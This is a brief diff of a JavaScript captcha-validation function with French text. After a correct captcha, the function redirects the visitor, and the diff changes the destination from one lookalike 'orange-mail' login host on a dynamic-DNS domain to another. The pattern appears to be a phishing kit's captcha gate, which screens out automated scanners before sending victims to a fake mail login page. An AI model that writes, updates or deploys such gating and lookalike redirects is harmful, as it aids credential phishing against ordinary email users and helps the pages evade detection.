@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://inik-orgelogin.tftpd.net/orange-mail/oro/";
+        targetURL="https://orge-inkling.tftpd.net/wp/oro/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
